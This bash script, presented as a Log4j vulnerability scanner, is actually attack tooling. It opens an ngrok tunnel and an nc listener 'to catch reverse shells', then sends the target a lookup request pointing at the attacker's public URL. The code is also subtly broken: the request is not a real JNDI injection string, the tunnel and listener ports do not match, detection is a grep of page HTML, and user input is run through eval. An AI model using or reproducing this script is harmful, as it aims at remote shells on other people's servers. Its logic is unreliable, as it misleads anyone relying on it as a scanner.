#!/bin/bash

echo "Vulnerability Scanner for Log4j"
echo "Checking if the server is vulnerable..."

# Prompt user for a URL
read -p "Enter the URL: " url

# Use curl to retrieve the server type from the HTTP response headers
server_type_header=$(curl -sI "$url" | grep -i "Server:" | awk '{print $2}')

# Use curl to retrieve the HTML content and check for common server identifiers
server_type_html=$(curl -sL "$url" | grep -iE "<meta[^>]*server[^>]*>" | sed -n 's/.*content="\([^"]*\)".*/\1/p')

# Display the detected server type
if [ -n "$server_type_header" ]; then
    serverType="$server_type_header"
    echo "Server Type (from header): $serverType"
elif [ -n "$server_type_html" ]; then
    serverType="$server_type_html"
    echo "Server Type (from HTML): $serverType"
else
    echo "Server type not detected. Exiting."
    exit 1
fi

# Extract the server's IP address and port from the URL
if [[ "$url" == "http://"* ]]; then
    ipAddressAndPort=${url:7}
elif [[ "$url" == "https://"* ]]; then
    ipAddressAndPort=${url:8}
else
    echo "Invalid URL. Please try again."
    exit 1
fi

echo "IP address and port: $ipAddressAndPort"

# Check if Log4j is present on the target server
echo "Checking for Log4j presence..."
log4jCheck=$(curl -s "$url" | grep -i "log4j")
if [[ -z "$log4jCheck" ]]; then
    echo "Log4j not detected on the target server. Exiting."
    exit 1
fi

echo "Log4j detected on the target server."

# Start a public HTTP server using ngrok
ngrok http 8888 > /dev/null 2>&1 &
sleep 5  # Wait for ngrok to start and provide the public URL

# Get the public URL from ngrok
publicUrl=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r .tunnels[0].public_url)

# Detecting Log4j vulnerability
echo "Checking for Log4j vulnerability..."

# Setup a listener to catch reverse shells
nc -l -p 4444 > output.txt &

# Generate a payload file for Log4j vulnerability
echo "Greeting from Log4j!" > payload.txt

curl_command="curl \"$url/jndi-manager/lookup?name=$publicUrl/payload.txt\" > /dev/null 2>&1"
eval $curl_command


# Wait for the reverse shell to establish
echo "Waiting for the reverse shell to establish..."
sleep 5

# Catch reverse shell output
output=$(cat output.txt)
echo "Reverse shell output: $output"

# Stop listener
echo "Stopping listener..."
killall nc

# Stop ngrok
killall ngrok
